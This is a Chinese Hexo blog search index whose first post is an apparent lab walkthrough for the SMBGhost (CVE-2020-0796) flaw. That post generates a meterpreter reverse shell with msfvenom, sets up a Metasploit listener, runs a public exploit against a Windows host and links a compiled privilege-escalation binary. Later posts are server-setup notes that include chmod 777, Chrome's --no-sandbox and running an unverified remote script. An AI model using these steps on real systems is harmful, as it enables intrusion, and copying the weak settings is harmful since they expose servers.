<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2020-0796 RCE和LPE</title>
      <link href="/archives/57083/"/>
      <url>/archives/57083/</url>
      
        <content type="html"><![CDATA[<h2 id="CVE-2020-0796"><a href="#CVE-2020-0796" class="headerlink" title="CVE-2020-0796"></a>CVE-2020-0796</h2><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><h6 id="CVE-2020-0796-Windows-SMBv3-客户端-服务器远程代码执行漏洞"><a href="#CVE-2020-0796-Windows-SMBv3-客户端-服务器远程代码执行漏洞" class="headerlink" title="CVE-2020-0796 | Windows SMBv3 客户端/服务器远程代码执行漏洞"></a>CVE-2020-0796 | Windows SMBv3 客户端/服务器远程代码执行漏洞</h6><p>Microsoft 服务器消息块 3.1.1 (SMBv3) 协议处理某些请求的方式中存在远程执行代码漏洞。成功利用此漏洞的攻击者可以获取在目标服务器或客户端上执行代码的能力。</p><p>要利用针对服务器的漏洞，未经身份验证的攻击者可以将特制数据包发送到目标 SMBv3 服务器。要利用针对客户端的漏洞，未经身份验证的攻击者将需要配置恶意的 SMBv3 服务器，并说服用户连接到该服务器。</p><p>此安全更新通过更正 SMBv3 协议处理这些特制请求的方式来修复此漏洞</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Windows 10版本1903（用于32位系统）</p><p>Windows 10版本1903（用于基于ARM64的系统）</p><p>Windows 10版本1903（用于基于x64的系统）</p><p>Windows 10版本1909（用于32位系统）</p><p>Windows 10版本1909（用于基于ARM64的系统）</p><p>Windows 10版本1909（用于）基于x64的系统</p><p>Windows Server 1903版（服务器核心安装）</p><p>Windows Server 1909版（服务器核心安装）</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p><a href="https://github.com/ollypwn/SMBGhost">https://github.com/ollypwn/SMBGhost</a></p><p><a href="https://github.com/ClarotyICS/CVE2020-0796">https://github.com/ClarotyICS/CVE2020-0796</a></p><h2 id="远程代码执行-POC"><a href="#远程代码执行-POC" class="headerlink" title="远程代码执行-POC"></a>远程代码执行-POC</h2><h3 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h3><p><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC/">https://github.com/chompie1337/SMBGhost_RCE_PoC/</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="系统版本"><a href="#系统版本" class="headerlink" title="系统版本"></a>系统版本</h3><p><img src="https://i.loli.net/2020/06/04/QiqLPSnHrYfFNVb.png"></p><p>下载代码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/chompie1337/SMBGhost_RCE_PoC.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/06/04/YBjsAkKbO4f6iSu.png"></p><p>生成python版的反向链接shellcode</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.2.140 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">1234</span> -f python -o <span class="token number">123</span>.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/06/04/oNJlABvMbz3TjgF.png"></p><p>将生成的shellcode的里的buf全部替换为USER_PAYLOAD</p><p><img src="https://i.loli.net/2020/06/04/bT5msrFJD6NMgIv.png"></p><p>用修改后的shellcode替换exploit.py里原来的shellcode</p><p><img src="https://i.loli.net/2020/06/04/y31bwoMzUksTA9H.png"></p><p>启动msf</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/multi/handler <span class="token comment">#设置模块</span>msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp <span class="token comment">#设置反弹shell类型</span>msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lport <span class="token number">1234</span> <span class="token comment">#设置本地端口</span>msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.2.140 <span class="token comment">#设置本地IP</span>msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run <span class="token comment">#开始监听</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/06/04/24Wa9173JNBqGlw.png"></p><p>执行exp（请使用python3，python2会导致蓝屏，exp不一定是一次成功，请多试几次，如果成功会提示按任意键发送shellcode，实际是按回车发送）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 exploit.py -ip <span class="token number">192.168</span>.2.107<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/06/04/9W3NaxYtPsUQkVu.png"></p><p>成功反弹shell</p><p><img src="https://i.loli.net/2020/06/04/fByxmLHhQni1PT8.png"></p><p>如果exp一直执行失败请检查是否被安全软件拦截</p><p><img src="https://i.loli.net/2020/06/04/cPSvnhlxW8F9B7f.png"></p><p><img src="https://i.loli.net/2020/06/04/wfhWnYs9Kzq2i1c.png"></p><p>也可在手机上进行复现（使用termux）</p><p><img src="https://i.loli.net/2020/06/04/aPbjZoT5YVi86hp.png"></p><h2 id="本地提权-POC"><a href="#本地提权-POC" class="headerlink" title="本地提权-POC"></a>本地提权-POC</h2><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><h4 id="C-版"><a href="#C-版" class="headerlink" title="C++版"></a>C++版</h4><p><a href="https://github.com/danigargu/CVE-2020-0796">https://github.com/danigargu/CVE-2020-0796</a></p><h4 id="Python版"><a href="#Python版" class="headerlink" title="Python版"></a>Python版</h4><p><a href="https://github.com/ZecOps/CVE-2020-0796-LPE-POC">https://github.com/ZecOps/CVE-2020-0796-LPE-POC</a></p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="系统版本-1"><a href="#系统版本-1" class="headerlink" title="系统版本"></a>系统版本</h3><p><img src="https://i.loli.net/2020/03/31/dBv6eFzTMUrwina.png"></p><h4 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h4><p><img src="https://i.loli.net/2020/03/31/hFMOs6nTj9paGm2.gif"></p><p>已编译好的文件</p><p><a href="/misc/cve-2020-0796-local.exe">cve-2020-0796-local.exe</a></p><p><a href="https://pan.baidu.com/s/1aaUO7_EX2m6fWUYcl30cZA">https://pan.baidu.com/s/1aaUO7_EX2m6fWUYcl30cZA</a></p><p>MD5: A51599467EE9CB676F5C29EBE5AC8DF6<br>SHA-256: 11F4D4957090535E9F99ED305AEB3B2E6D28A5F5E495AE444EDB839C2FEFFB36</p><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><p><img src="https://i.loli.net/2020/03/31/fMXzby6eAVro8FO.gif"></p><h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><h4 id="1-禁用-SMBv3-压缩"><a href="#1-禁用-SMBv3-压缩" class="headerlink" title="1.禁用 SMBv3 压缩"></a>1.禁用 SMBv3 压缩</h4><p>您可以使用以下 PowerShell 命令禁用压缩功能，以阻止未经身份验证的攻击者利用<strong>SMBv3 服务器</strong>的漏洞。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"</span> DisableCompression <span class="token operator">-</span><span class="token function">Type</span> DWORD <span class="token operator">-</span>Value 1 <span class="token operator">-</span>Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>注意：</strong></p><ol><li>进行更改后，无需重启。</li><li><strong>此解决方法不能阻止利用 SMB 客户端；请参阅常见问题解答下的第 2 项，以保护客户端。</strong></li><li>Windows 或 Windows Server 尚未使用 SMB 压缩，并且禁用 SMB 压缩不会产生负面的性能影响。</li></ol><p>你可以使用下面的 PowerShell 命令禁用该变通方法。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"</span> DisableCompression <span class="token operator">-</span><span class="token function">Type</span> DWORD <span class="token operator">-</span>Value 0 <span class="token operator">-</span>Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>注意：</strong> 禁用此解决方法后，无需重启。</p><h4 id="2-打补丁"><a href="#2-打补丁" class="headerlink" title="2.打补丁"></a>2.打补丁</h4><p><a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4551762">https://www.catalog.update.microsoft.com/Search.aspx?q=KB4551762</a></p><h4 id="3-更新至2004"><a href="#3-更新至2004" class="headerlink" title="3.更新至2004"></a>3.更新至2004</h4>]]></content>
      
      
      <categories>
          
          <category> 资源分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资源分享 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo+Git+Nginx的配置</title>
      <link href="/archives/63671/"/>
      <url>/archives/63671/</url>
      
        <content type="html"><![CDATA[<h3 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h3><p>Ubuntu官方源里有nginx的稳定版，我这里选择最新版进行安装</p><p><a href="http://nginx.org/en/linux_packages.html#Ubuntu">官方指南</a></p><h5 id="添加源"><a href="#添加源" class="headerlink" title="添加源"></a>添加源</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"deb [arch=amd64 ] http://nginx.org/packages/mainline/ubuntu <span class="token variable"><span class="token variable">`</span>lsb_release -cs<span class="token variable">`</span></span> nginx"</span> <span class="token punctuation">\</span>    <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/nginx.list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="导入签名密钥"><a href="#导入签名密钥" class="headerlink" title="导入签名密钥"></a>导入签名密钥</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -fsSL https://nginx.org/keys/nginx_signing.key <span class="token operator">|</span> <span class="token function">sudo</span> apt-key <span class="token function">add</span> -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> nginx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/03/13/COdYMJzj3PZDm7w.png"></p><h3 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h3><p>Ubuntu官方源里有git的稳定版，我这里选择最新版进行安装</p><p><a href="https://git-scm.com/download/linux">官方指南</a></p><h5 id="使用add-apt-repository命令添加源（会自动导入密钥）"><a href="#使用add-apt-repository命令添加源（会自动导入密钥）" class="headerlink" title="使用add-apt-repository命令添加源（会自动导入密钥）"></a>使用add-apt-repository命令添加源（会自动导入密钥）</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> add-apt-repository ppa:git-core/ppa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/03/13/F95UfXHuSsZzy8G.png"></p><h3 id="配置Git"><a href="#配置Git" class="headerlink" title="配置Git"></a>配置Git</h3><p>在vps上配置git，方便hexo deploy</p><p><a href="https://git-scm.com/book/zh/v2/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E9%85%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E5%99%A8">官方指南</a></p><h5 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> adduser <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/03/13/ZgDLfyja569oYlX.png"></p><h5 id="配置authorized-keys"><a href="#配置authorized-keys" class="headerlink" title="配置authorized_keys"></a>配置authorized_keys</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> <span class="token function">git</span><span class="token builtin class-name">cd</span><span class="token function">mkdir</span> .ssh <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> <span class="token number">700</span> .ssh<span class="token function">touch</span> .ssh/authorized_keys <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> <span class="token number">600</span> .ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="导入用户id-rsa"><a href="#导入用户id-rsa" class="headerlink" title="导入用户id_rsa"></a>导入用户id_rsa</h5><p>详见<a href="https://xcxmiku.com/archives/a1f6425f/#toc-heading-10">VPS的配置与优化</a></p><h5 id="限制-Git-用户使用SSH登陆"><a href="#限制-Git-用户使用SSH登陆" class="headerlink" title="限制 Git 用户使用SSH登陆"></a>限制 Git 用户使用SSH登陆</h5><p>将git-shell添加到/etc/shells（git-shell的路径一般为/usr/bin/git-shell）</p><p><img src="https://i.loli.net/2020/03/13/E53hAwoMkQ69JxX.png"></p><p>把git默认的shell替换成git-shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> chsh <span class="token function">git</span> -s <span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> git-shell<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者直接修改/etc/passwd文件，将</p><p>git:\x:1000:1000:,,,:/home/git:/bin/bash</p><p>改为</p><p>git:\x:1000:1000:,,,:/home/git:/usr/bin/git-shell</p><h3 id="创建Git仓库"><a href="#创建Git仓库" class="headerlink" title="创建Git仓库"></a>创建Git仓库</h3><h5 id="初始化仓库"><a href="#初始化仓库" class="headerlink" title="初始化仓库"></a>初始化仓库</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /home/git/<span class="token function">git</span> init --bare blog.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="更改权限"><a href="#更改权限" class="headerlink" title="更改权限"></a>更改权限</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chown</span> -R git:git blog.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="测试git-clone"><a href="#测试git-clone" class="headerlink" title="测试git clone"></a>测试git clone</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone git@vpsip:~/blog.git <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果修改ssh端口请使用以下命令（xxx为端口号）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone ssh://git@vpsip:xxx/~/blog.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="建立tmp和blog目录"><a href="#建立tmp和blog目录" class="headerlink" title="建立tmp和blog目录"></a>建立tmp和blog目录</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> -p /home/git/tmp<span class="token function">mkdir</span> -p /home/git/blog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="设置git-post-receive-钩子"><a href="#设置git-post-receive-钩子" class="headerlink" title="设置git post-receive 钩子"></a>设置git post-receive 钩子</h5><p>编辑/home/git/blog.git/hooks/post-receive文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash -l</span><span class="token assign-left variable">GIT_REPO</span><span class="token operator">=</span>/home/git/blog.git<span class="token assign-left variable">TMP_GIT_CLONE</span><span class="token operator">=</span>/home/git/tmp<span class="token assign-left variable">PUBLIC_WWW</span><span class="token operator">=</span>/home/git/blog<span class="token function">rm</span> -rf <span class="token variable">$&#123;TMP_GIT_CLONE&#125;</span><span class="token function">git</span> clone <span class="token variable">$GIT_REPO</span> <span class="token variable">$TMP_GIT_CLONE</span><span class="token function">rm</span> -rf <span class="token variable">$&#123;PUBLIC_WWW&#125;</span><span class="token function">cp</span> -rf <span class="token variable">$&#123;TMP_GIT_CLONE&#125;</span> <span class="token variable">$&#123;PUBLIC_WWW&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="修改各个文件夹权限"><a href="#修改各个文件夹权限" class="headerlink" title="修改各个文件夹权限"></a>修改各个文件夹权限</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x /home/git/blog.git/hooks/post-receive<span class="token function">chmod</span> <span class="token number">777</span> -R /home/git/blog.git<span class="token function">chmod</span> <span class="token number">777</span> -R /home/git/blog<span class="token function">chmod</span> a+r /home/git/blog<span class="token function">chmod</span> <span class="token number">777</span> -R /home/git/tmp<span class="token function">chown</span> -R git:git /home/git/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Hexo配置"><a href="#Hexo配置" class="headerlink" title="Hexo配置"></a>Hexo配置</h3><p>修改_config.yml文件里的deploy字段</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">deploy</span><span class="token punctuation">:</span><span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> git  <span class="token key atrule">repository</span><span class="token punctuation">:</span> git@vpsip<span class="token punctuation">:</span>~/blog.git  <span class="token key atrule">branch</span><span class="token punctuation">:</span> master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果修改ssh端口请将repository修改为（xxx为端口号）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh://git@vpsip:xxx/~/blog.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Nginx配置"><a href="#Nginx配置" class="headerlink" title="Nginx配置"></a>Nginx配置</h3><p>推荐直接使用digitalocean的nginx在线配置生成</p><p><a href="https://www.digitalocean.com/community/tools/nginx">链接</a>   <a href="https://github.com/digitalocean/nginxconfig.io">源码</a></p><p><img src="https://i.loli.net/2020/03/14/tTfH2Dmph5uCaZM.png"></p><p>按顺序填写完需求后，下载配置文件至vps，解压即可，也可自行复制粘贴</p><p>Nginx全局配置文件为/etc/nginx/nginx.conf，为了防止错误修改全局文件，我选择修改/etc/nginx/conf.d文件夹里的子项目配置文件default.conf</p><p>配置SSL和网站路径</p><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">server</span></span><span class="token punctuation">&#123;</span>    <span class="token directive"><span class="token keyword">listen</span> <span class="token number">443</span></span><span class="token punctuation">;</span> <span class="token comment">#监听443端口</span>    <span class="token directive"><span class="token keyword">server_name</span> xxxx.com</span><span class="token punctuation">;</span> <span class="token comment">#配置域名</span>    <span class="token directive"><span class="token keyword">ssl</span> <span class="token boolean">on</span></span><span class="token punctuation">;</span> <span class="token comment">#开启SSL</span>    <span class="token directive"><span class="token keyword">ssl_certificate</span> domain.cert</span><span class="token punctuation">;</span> <span class="token comment">#证书</span>    <span class="token directive"><span class="token keyword">ssl_certificate_key</span> private.key</span><span class="token punctuation">;</span> <span class="token comment">#私钥</span>    <span class="token directive"><span class="token keyword">location</span> /</span> <span class="token punctuation">&#123;</span>        <span class="token directive"><span class="token keyword">root</span>  /home/git/blog</span><span class="token punctuation">;</span> <span class="token comment">#网站路径</span>        <span class="token directive"><span class="token keyword">index</span>  index.html index.htm</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置HTTP跳转至HTTPS</p><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">&#123;</span>    <span class="token directive"><span class="token keyword">listen</span> <span class="token number">80</span></span><span class="token punctuation">;</span> <span class="token comment">#监听443端口</span>    <span class="token directive"><span class="token keyword">server_name</span> xxxx.com</span><span class="token punctuation">;</span> <span class="token comment">#配置域名</span>    <span class="token directive"><span class="token keyword">return</span> <span class="token number">301</span> https://<span class="token variable">$server_name</span><span class="token variable">$request_uri</span></span><span class="token punctuation">;</span> <span class="token comment">#跳转</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>防止列目录</p><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">http</span></span> <span class="token punctuation">&#123;</span><span class="token directive"><span class="token keyword">autoindex</span> <span class="token boolean">off</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>不知响应头里显示nginx版本号</p><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">http</span></span> <span class="token punctuation">&#123;</span><span class="token directive"><span class="token keyword">server_tokens</span> <span class="token boolean">off</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>配置完后使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nginx -t<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检测是否有误</p><p><img src="https://i.loli.net/2020/03/14/CqTMSrveymkOa4Q.png"></p><p>启动nginx</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> nginxsystemctl start nginxnginx -s reload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一笔加密货币(ETH)交易</title>
      <link href="/archives/991371b6/"/>
      <url>/archives/991371b6/</url>
      
        <content type="html"><![CDATA[<h2 id="交易记录"><a href="#交易记录" class="headerlink" title="交易记录"></a><a href="https://etherchain.org/tx/0x3074afacd5d2450c5aa58264ed26e64bc8677a6f62d699911a82b59c98bd15df">交易记录</a></h2><p><img src="https://i.loli.net/2020/03/08/KDmsLbe384hV6rj.png"></p><p>用于购买<a href="https://porkbun.com/">Porkbun</a>的域名</p>]]></content>
      
      
      <categories>
          
          <category> 加密货币 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加密货币 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Root用户下运行Google Chrome</title>
      <link href="/archives/2e214463/"/>
      <url>/archives/2e214463/</url>
      
        <content type="html"><![CDATA[<h4 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h4><p><a href="https://chromium.googlesource.com/chromium/src/+/master/docs/linux/sandboxing.md">chromium的沙盒机制(sandbox)</a>无法在root用户下运行</p><p><img src="https://i.loli.net/2020/03/06/JcavdFy9s1DZx3I.png"></p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>在命令行下输入如下代码即可启动</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">google-chrome --no-sandbox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如需通过桌面图标启动，请修改/usr/share/applications/google-chrome.desktop文件</p><pre class="line-numbers language-none"><code class="language-none">Exec&#x3D;&#x2F;usr&#x2F;bin&#x2F;google-chrome-stable %U<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>改为</p><pre class="line-numbers language-none"><code class="language-none">Exec&#x3D;&#x2F;usr&#x2F;bin&#x2F;google-chrome-stable --no-sandbox %U <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有三处，都添加–no-sandbox即可</p><p><img src="https://i.loli.net/2020/03/06/HzcjWK4LXEqpumn.png"></p><p><img src="https://i.loli.net/2020/03/06/5w182QBOUljTCvx.png"></p><p><img src="https://i.loli.net/2020/03/06/5w182QBOUljTCvx.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技术分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VPS的配置与优化</title>
      <link href="/archives/a1f6425f/"/>
      <url>/archives/a1f6425f/</url>
      
        <content type="html"><![CDATA[<p>因为某些原因重装了VPS，简单记录下重装后的配置。</p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>推荐一个颜值很高且多终端同步的SSH客户端<a href="https://termius.com/">Termius</a></p><p><img src="https://i.loli.net/2020/03/05/Bv2ygLfKASeERlZ.png"></p><p>vps上重装的系统是Ubuntu 18.04 LTS Server - 64 Bit </p><h3 id="配置与优化"><a href="#配置与优化" class="headerlink" title="配置与优化"></a>配置与优化</h3><h4 id="更新源和软件"><a href="#更新源和软件" class="headerlink" title="更新源和软件"></a>更新源和软件</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> update<span class="token function">apt</span> upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="将语言设置为中文"><a href="#将语言设置为中文" class="headerlink" title="将语言设置为中文"></a>将语言设置为中文</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dpkg-reconfigure locales<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/03/05/wu8cT5Ja1HqLVUS.png"></p><p>用空格选择全部zh开头的选项（也可只选择 zh_CN.UTF-8）</p><p><img src="https://i.loli.net/2020/03/05/dJeg3DIp4CiMTB8.png"></p><p>设置系统默认语言为 zh_CN.UTF-8</p><p><img src="https://i.loli.net/2020/03/05/ABkwtDFj37EScK1.png"></p><p>重新连接后默认语言就是中文了</p><h4 id="修改时区"><a href="#修改时区" class="headerlink" title="修改时区"></a>修改时区</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">timedatectl set-timezone Asia/Shanghai <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="修改vps默认的root密码"><a href="#修改vps默认的root密码" class="headerlink" title="修改vps默认的root密码"></a>修改vps默认的root密码</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">passwd</span> root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/03/05/IM3abWGiB5nwulD.png"></p><h4 id="安装常用工具"><a href="#安装常用工具" class="headerlink" title="安装常用工具"></a>安装常用工具</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> <span class="token function">vim</span> <span class="token function">wget</span> <span class="token function">git</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="安装BBR-锐速"><a href="#安装BBR-锐速" class="headerlink" title="安装BBR/锐速"></a>安装BBR/锐速</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -N --no-check-certificate <span class="token string">"https://github.000060000.xyz/tcpx.sh"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> +x tcpx.sh <span class="token operator">&amp;&amp;</span> ./tcpx.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/03/05/gdji4FrqzLhTY3M.png"></p><p>详见<a href="https://github.com/ylx2016/Linux-NetSpeed/releases">Linux-NetSpeed</a></p><h4 id="修改SSH端口"><a href="#修改SSH端口" class="headerlink" title="修改SSH端口"></a>修改SSH端口</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/ssh/sshd_config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在原本的Port 22下面加一行（可能是注释的，请删除#号）</p><p>Port 2233 2233为需要修改的端口</p><p><img src="https://i.loli.net/2020/03/06/sGKhCXPgHTwIkaL.png"></p><p>重启服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart sshd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看是否监听了修改的端口</p><pre class="line-numbers language-bash" data-language="bash"><code 